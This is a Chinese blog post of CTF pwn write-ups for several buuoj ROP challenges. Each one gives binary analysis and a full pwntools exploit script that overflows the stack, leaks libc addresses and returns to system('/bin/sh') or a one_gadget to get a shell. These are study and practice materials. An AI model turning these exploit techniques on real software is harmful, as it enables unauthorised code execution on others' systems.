<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>ROP题目练习 ~ Welcome to Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Welcome to Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期一, 二月 3日 2020, 4:21 下午
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    2.4k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      11 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="ROP题目练习"><a href="#ROP题目练习" class="headerlink" title="ROP题目练习"></a>ROP题目练习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。</p>
<h1 id="有libc（或者无libc可做）"><a href="#有libc（或者无libc可做）" class="headerlink" title="有libc（或者无libc可做）"></a>有libc（或者无libc可做）</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32位程序，开启NX堆栈不可执行。</p>
<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>可以看出其取了一个随机数，存入buf。<br><img src="/2020/02/03/ROP练习/images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：<br><img src="/2020/02/03/ROP练习/images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。<br> <img src="/2020/02/03/ROP练习/images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。</p>
<h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><p>其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用<code>\x00</code>来截断。<br>v5这个返回参数可以控制为’\xff’,然后进入带有溢出的函数，写rop链就行了。<br>先用puts函数泄露出<code>__libc_start_main</code>的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import time
# io = process(&#39;./pwn&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,27780)
libc = ELF(&#39;./libc-2.23.so&#39;)
# blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)
elf = ELF(&#39;./pwn&#39;)
# raw_input(&#39;-&gt;&#39;)
p1 = &#39;\x00&#39;.ljust(8,&#39;\xff&#39;) 
offset = 0xe7 + 4
io.send(p1 + &#39;\n&#39;)
io.recvline_contains(&#39;Correct&#39;)
start_add=0x080485A0
put_add = elf.symbols[&#39;puts&#39;]
libc_start_add = elf.got[&#39;__libc_start_main&#39;]
rop1 = [
    put_add,
    start_add,
    libc_start_add
]
p2 = offset * &#39;\x00&#39; + &#39;&#39;.join(map(p32,rop1))
io.sendline(p2)
sleep(1)
libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;]
REC = libc_base+0x3a80c
print(&#39;libc_base :&#39;+hex(libc_base))
offset = 0xe7 + 4
io.send(p1 + &#39;\n&#39;)
io.recvline_contains(&#39;Correct&#39;)
p3 = offset * &#39;\x00&#39; + p32(REC)
io.sendline(p3)
io.interactive()</code></pre>
<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p>
<h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-10h]

  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);
  __isoc99_scanf(&quot;%s&quot;, &amp;v4);
  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);
  return 0;
}</code></pre><p>程序十分简单，给了system函数，且明显存在溢出。<br><img src="/2020/02/03/ROP练习/images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>ida查看字符串，该可以发现<code>/bin/sh</code>/，这构造个简单rop链直接利用就好了。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
import time
# io = process(&#39;./babyrop&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,28633)
elf = ELF(&#39;./babyrop&#39;)
offset = 0x10 + 8
binsh_add = 0x0601048
pop_rdi_ret=0x000400683 
system_add = elf.symbols[&#39;system&#39;]
# io.recvline_contains(&#39;your&#39;)
# raw_input(&#39;-&gt;&#39;)
p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)
io.sendline(p)
io.interactive()</code></pre><p>拿到shell后，这个题buuctf根目录下没有flag文件。需要<code>find / -name &quot;flag&quot;</code> 可以查到是在<code>/home/babyrop/flag</code>这个目录下。</p>
<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p>
<h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出<code>__libc_start_main</code>函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
import time
io = process(&#39;./babyrop2&#39;)
# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)
# context.log_level = &#39;debug&#39;
libc = ELF(&#39;./libc.so.6&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,27694)
elf = ELF(&#39;./babyrop2&#39;)
offset = 40
__libc_start_add = elf.got[&#39;__libc_start_main&#39;]
start_add = 0x0400540 
printf_add = elf.symbols[&#39;printf&#39;]
aWelcomeToThePw = 0x400770 
pop_rdi_ret= 0x000400733
pop_rsi_r15_ret = 0x00400731 
libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;]
rop1 = [
    pop_rdi_ret,
    aWelcomeToThePw,
    pop_rsi_r15_ret,
    __libc_start_add,
    0,
    printf_add,
    start_add
]
io.recvuntil(&#39;e? &#39;)
# io.recvuntil(&#39;again, &#39;)
# raw_input(&#39;-&gt;&#39;)
p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1))
io.sendline(p)
io.recvline_contains(&#39;again&#39;)
s = io.recvline_contains(&#39;again&#39;)
libc_base = int(u64(s[32:38].ljust(8,&#39;\x00&#39;))) - libc_start_sys
RCE = libc_base + 0x4526a
print(&#39;libc_base:&#39;+hex(libc_base))
io.recvuntil(&#39;name? &#39;)
# io.recvuntil(&#39;name? &#39;)
p = &#39;\x00&#39; * offset + p64(RCE) + &#39;\x00&#39; * 70
sleep(1)
raw_input(&#39;-&gt;&#39;)
io.sendline(p)
io.interactive()
</code></pre><h1 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h1><p>这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~<br>已经测试出办法咯。<br><code>https://github.com/lieanu/LibcSearcher</code></p>
<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="查保护和arch-3"><a href="#查保护和arch-3" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p>
<h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出<code>__libc_start_main</code>函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于<code>system(&#39;/bin/sh&#39;)</code>的rop链即可。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
from LibcSearcher import *
import time
# context.log_level = &#39;debug&#39;
io = remote(&#39;node3.buuoj.cn&#39;,28661)
# io = process(&#39;./bjdctf_2020_babyrop&#39;)
elf = ELF(&#39;./bjdctf_2020_babyrop&#39;)
# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)
io.recvuntil(&#39;story!\n&#39;)
padding = 40
libc_main_add = elf.got[&#39;__libc_start_main&#39;]
puts_add = elf.symbols[&#39;puts&#39;]
pop_rdi_ret = 0x0400733 
p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)
io.sendline(p)
s = u64(io.recv(6).ljust(8,&#39;\x00&#39;))
print(hex(s))
obj = LibcSearcher(&quot;__libc_start_main&quot;,s)
libc_base = s - obj.dump(&quot;__libc_start_main&quot;)
system_add = libc_base + obj.dump(&quot;system&quot;)
binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)
sleep(1)
io.recvuntil(&#39;story!\n&#39;)
p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)
io.sendline(p)
io.interactive()</code></pre><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="查保护和arch-4"><a href="#查保护和arch-4" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p>
<h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>主程序主要就是限制了v2需要等于<code>ffff</code>才能进入带有溢出的函数，v2的值是<br><img src="/2020/02/03/ROP练习/images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>这个在read的时候把控好，让ffff填入这个位置即可。<br><img src="/2020/02/03/ROP练习/images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是<code>ebp-0x10</code>，<img src="/2020/02/03/ROP练习/images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>然后分析下这里的汇编，它把read函数的溢出位置返回值<code>ebp-0x14</code>取出来，与<code>0x8050000</code>进行比较。<br><img src="/2020/02/03/ROP练习/images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。</p>
<h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p>先控制好v2让其等于<code>ffff</code>，然后进入带有溢出的函数，然后构造rop链，先把<code>__libc_start_main</code>的内存地址泄露出来，然后用libcseacher来确定libc版本，<br>然后dump出<code>__libc_start_main的sympols</code>,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
from LibcSearcher import *
import time
# context.log_level = &#39;debug&#39;
io = process(&#39;./easyrop&#39;)
# io = remote(&#39;183.129.189.60&#39;,10011)
io.recvuntil(&#39;TFer!\n&#39;)
e =ELF(&#39;./easyrop&#39;)
raw_input(&#39;-&gt;&#39;)
padding = 36
start_add = 0x08048400
libc_start_main = e.got[&#39;__libc_start_main&#39;]
puts_add = e.symbols[&#39;puts&#39;]
ret = 0x0804839e
p = &#39;f&#39; * padding
rop1 = [
    puts_add,
    start_add,
    libc_start_main
]
io.sendline(p)
io.recvuntil(&#39;name?\n&#39;)
p = &#39;\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1))
raw_input(&#39;&gt;&#39;)
io.sendline(p)
libc_start_add = u32(io.recv(4))
obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)
libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)
print(libc_base)
system_add = obj.dump(&#39;system&#39;) + libc_base
binsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_base
io.recvuntil(&#39;TFer!\n&#39;)
p = &#39;f&#39; * padding
io.sendline(p)
io.recvuntil(&#39;name?\n&#39;)
rop2 = [
    ret,
    system_add,
    start_add,
    binsh_add
]
p = &#39;\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2))
sleep(1)
io.sendline(p)
io.interactive()
</code></pre><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="查保护和arch-5"><a href="#查保护和arch-5" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32位</p>
<h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  be_nice_to_people();
  vulnerable_function();
  return write(1, &quot;Hello, World\n&quot;, 0xDu);
}</code></pre><p>主函数很简单，漏洞函数是在第二个函数。<br><img src="/2020/02/03/ROP练习/images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>栈溢出，然后直接构造rop链即可。<br><img src="/2020/02/03/ROP练习/images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>利用思路：用wirte函数泄露出<code>__libc_start_main</code>在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。</p>
<p>这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。<br><img src="/2020/02/03/ROP练习/images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>这个是让你选择的。<br><img src="/2020/02/03/ROP练习/images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p>
<p><img src="/2020/02/03/ROP练习/images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。<br><img src="/2020/02/03/ROP练习/images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
from LibcSearcher import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
elf = ELF(&#39;./2018_rop&#39;)
# io = process(&#39;./2018_rop&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,29692)
padding = 140 
write_plt = elf.symbols[&#39;write&#39;]
libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]
start = 0x080483C0 
p = padding * &#39;\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10])
# raw_input(&#39;-&gt;&#39;)
io.sendline(p)
libc_start_main_add = u32(io.recv(4))
obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)
libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)
system_add = libc_base + obj.dump(&#39;system&#39;)
binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;)
# print(libc.symbols[&#39;__libc_start_main&#39;])
print(hex(libc_base))
# io.recvline()
RCE = libc_base + 0x3cbec
p = padding * &#39;\x00&#39; + p32(RCE) + padding * &#39;\x00&#39;
# p = padding * &#39;\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add)
io.sendline(p)
io.interactive()</code></pre><p>这里面两种办法都行。</p>
<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="查保护和arch-6"><a href="#查保护和arch-6" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code> Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>主函数十分简单，漏洞在vuln函数：<br><img src="/2020/02/03/ROP练习/images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。</p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
from LibcSearcher import *
# io = process(&#39;./bof&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,27178)
elf = ELF(&#39;./bof&#39;)
libc = elf.libc
context.arch = &#39;i386&#39;
context.log_level = &#39;debug&#39;
padding = 112
start_add = 0x080483E0
libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]
write_plt = elf.symbols[&#39;write&#39;]
io.recvuntil(&#39;2015~!\n&#39;)
p = padding * &#39;\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10])
io.sendline(p)
libc_start_main_add = u32(io.recv(4))
obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)
libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)
print(hex(libc_start_main_add))
print(hex(libc_base))
io.recvuntil(&#39;2015~!\n&#39;)
rce = libc_base + 0x3a80c
p = padding * &#39;\x00&#39; + p32(rce) + padding * &#39;\x00&#39;
io.sendline(p)
io.interactive()</code></pre>
<p>还是本地来base库查libc的one_gadget，然后ret to rce。</p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    
  <!-- 备案信息 -->
  <a href="http://beian.miit.gov.cn/" target="_blank"
     rel="nofollow noopener">豫ICP备20003962号</a>
  
    <a
      href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=20003962"
      rel="nofollow noopener"
      class="police-beian"
      target="_blank"
    >
      <span class="police-beian-sep">&nbsp;|&nbsp;</span>
      
        <img src="/img/police_beian.png" srcset="/img/loading.gif" />
      
      <span>京公网安备12345678号</span>
    </a>
  



    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "ROP题目练习&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
